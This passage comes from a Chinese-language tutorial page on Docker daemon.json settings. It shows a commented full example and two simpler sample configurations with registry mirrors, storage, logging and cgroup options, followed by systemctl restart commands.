<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 每次拉取的最大并发下载量</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "max-concurrent-downloads"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 每次推送的最大并发上传量</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "max-concurrent-uploads"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 每次拉取的最大下载尝试次数</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "max-download-attempts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "mtu"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "no-new-privileges"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "node-generic-resources"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "NVIDIA-GPU=UUID1"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "NVIDIA-GPU=UUID2"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "oom-score-adjust"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">-500</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "pidfile"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  //  增加代理配置</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "proxies"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "http-proxy"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"http://proxy.example.com:80"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "https-proxy"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"https://proxy.example.com:443"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "no-proxy"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"*.test.example.com,.example.org"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "raw-logs"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 镜像源管理</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "registry-mirrors"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 可用于运行容器的可用OCI运行时列表</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "runtimes"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "cc-runtime"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "path"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/usr/bin/cc-runtime"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "custom"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "path"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/usr/local/bin/my-runc-replacement"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "runtimeArgs"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        "--debug"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      ]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "seccomp-profile"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 默认 false，启用selinux支持</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "selinux-enabled"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "shutdown-timeout"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">15</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "storage-driver"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "storage-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "swarm-default-advertise-addr"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 启动TLS认证开关</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "tls"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "tlscacert"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "tlscert"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "tlskey"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "tlsverify"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "userland-proxy"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "userland-proxy-path"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/usr/libexec/docker-proxy"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "userns-remap"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>Simple1</h2>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "graph"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/data/docker"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 存储路径</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "storage-driver"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"overlay2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// 存储驱动</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "storage-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "overlay2.override_kernel_check=true"</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> // overlay2 检查</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "insecure-registries"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "harbr.docker.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "registry.access.redhat.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "quay.io"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "http://f1361db2.m.daocloud.io"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "registry-mirrors"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.zhai.cm"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://a.ussh.net"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.littlediary.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.rat.dev"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://atomhub.openatom.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.m.daocloud.io"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.1ms.run"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dytt.online"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://func.ink"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://lispy.org"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.xiaogenban1993.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.mybacc.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.yomansunter.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dockerhub.websoft9.com"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "bip"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"172.7.5.1/24"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">// bridge 的 ip</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "exec-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "native.cgroupdriver=systemd"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ], </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//定义cgroup驱动</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "live-restore"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> // docker容器不依赖与docker引擎  ，引擎死容器不死</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  "log-driver"</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "json-file"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "log-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "max-size"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"100m"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "data-root"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/data/docker"</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> // docker数据存储在哪里</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">systemctl daemon-reload</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">systemctl restart docker</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">systemctl enable docker</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>Simple2</h2>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "registry-mirrors"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.zhai.cm"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://a.ussh.net"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.littlediary.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.rat.dev"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://atomhub.openatom.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.m.daocloud.io"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.1ms.run"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dytt.online"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://func.ink"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://lispy.org"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.xiaogenban1993.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.mybacc.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.yomansunter.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dockerhub.websoft9.com"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "exec-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "native.cgroupdriver=systemd"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "max-concurrent-downloads"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//下载并发</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "max-concurrent-uploads"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">5</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">//上传并发</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "log-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "max-size"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"300m"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "max-file"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"2"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "live-restore"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
